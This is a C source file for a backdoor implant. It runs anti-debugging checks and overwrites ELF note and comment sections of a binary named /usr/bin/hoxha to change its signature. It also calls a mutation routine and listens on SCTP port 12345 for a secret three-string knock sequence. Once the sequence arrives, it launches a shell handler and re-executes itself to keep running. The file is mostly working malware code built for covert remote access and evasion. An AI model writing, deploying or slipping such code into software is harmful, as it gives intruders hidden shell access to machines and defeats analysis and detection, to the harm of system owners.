#include <elf.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <limits.h> 
#include <errno.h>
#include <netinet/in.h>
#include <netinet/sctp.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include "anti_debug.h"

#define PORT_TO_KNOCK 12345
#define EXPECTED_SEQUENCE_SIZE 3
#define BUFSIZE 1024

extern int perform_action();     		
extern void anti_debug();        		
extern void check_tracer_pid(void);
extern void block_ptrace_attaches(void);
extern void install_seccomp_ptrace_kill(void);
extern int mutate_main(int argc, char **argv);

const char *EXPECTED_SEQUENCE[EXPECTED_SEQUENCE_SIZE] = {
    "nqXCT2xfFsvYktHG3d8gPV",
    "VqhEGfaeFTdSmUW7M4QkNz",
    "VXjdmp4QcBtH75S2Yf8gPx"
};

// Attempt to determine path to self: first argv[0], then /proc fallback
const char *resolve_self_path(const char *argv0) {
    if (argv0 && argv0[0] == '/') {
        struct stat st;
        if (stat(argv0, &st) == 0) {
            return argv0;
        }
    }

#ifdef __FreeBSD__
    return "/proc/curproc/file";
#else
    return "/proc/self/exe";
#endif
}

void error(const char *msg) {
    perror(msg);
    exit(EXIT_FAILURE);
}

void patch_note_section(FILE *f) {
    Elf64_Ehdr ehdr;
    fread(&ehdr, 1, sizeof(ehdr), f);
    fseek(f, ehdr.e_shoff, SEEK_SET);

    Elf64_Shdr shdr;
    char shstrtab[4096] = {0};

    fseek(f, ehdr.e_shoff + ehdr.e_shentsize * ehdr.e_shstrndx, SEEK_SET);
    fread(&shdr, 1, sizeof(shdr), f);
    fseek(f, shdr.sh_offset, SEEK_SET);
    fread(shstrtab, 1, sizeof(shstrtab) - 1, f);

    for (int i = 0; i < ehdr.e_shnum; ++i) {
        fseek(f, ehdr.e_shoff + i * ehdr.e_shentsize, SEEK_SET);
        fread(&shdr, 1, sizeof(shdr), f);
        const char *name = &shstrtab[shdr.sh_name];
        if (strcmp(name, ".note.ABI-tag") == 0 || strcmp(name, ".comment") == 0) {
            fseek(f, shdr.sh_offset, SEEK_SET);
            char junk[] = "RANDOMIZED-SECTION\0";
            fwrite(junk, 1, sizeof(junk) - 1, f);
            break;
        }
    }
}

int main(int argc, char **argv) {
    (void)argc;
    int sock;
    struct sockaddr_in servaddr, cliaddr;
    socklen_t len;
    char buffer[BUFSIZE];
    int sequenceIndex = 0;
    //run_antidebug();
    anti_debug();

    const char *self_path = resolve_self_path(argv[0]);

    // Optional ELF mutation
    FILE *f = fopen("/usr/bin/hoxha", "r+b");
    if (f) {
        patch_note_section(f);
        fclose(f);
    }

    sock = socket(AF_INET, SOCK_SEQPACKET, IPPROTO_SCTP);
    if (sock < 0) error("socket");

    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    inet_pton(AF_INET, "0.0.0.0", &servaddr.sin_addr);
    servaddr.sin_port = htons(PORT_TO_KNOCK);

    if (bind(sock, (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0)
        error("bind");

    if (listen(sock, 5) < 0)
        error("listen");

    printf("Listening for SCTP knocks on port %d...\n", PORT_TO_KNOCK);

    while (1) {
        memset(buffer, 0, sizeof(buffer));
        len = sizeof(cliaddr);

        ssize_t n = recvfrom(sock, buffer, sizeof(buffer) - 1, 0,
                             (struct sockaddr *)&cliaddr, &len);
        if (n < 0) error("recvfrom");

        buffer[n] = '\0';
        printf("Received knock: %s\n", buffer);

        if (strcmp(buffer, EXPECTED_SEQUENCE[sequenceIndex]) == 0) {
            sequenceIndex++;
            if (sequenceIndex == EXPECTED_SEQUENCE_SIZE) {
                printf("[*] Correct sequence received. Executing shell handler…\n");
                perform_action(); // this may block
                printf("[*] Shell client disconnected. Restarting self…\n");
                close(sock);

                // Replace current process with a fresh instance
                char *newargv[] = { (char *)self_path, NULL };
                execv(self_path, newargv);

                // If execv returns, something went wrong
                perror("execv");
                exit(EXIT_FAILURE);
            }
        } else {
            sequenceIndex = 0;
        }

        int fake_argc = 1;
        char *fake_argv[] = { "program_name", NULL };
        mutate_main(fake_argc, fake_argv);
    }

    close(sock);
    return 0;
}
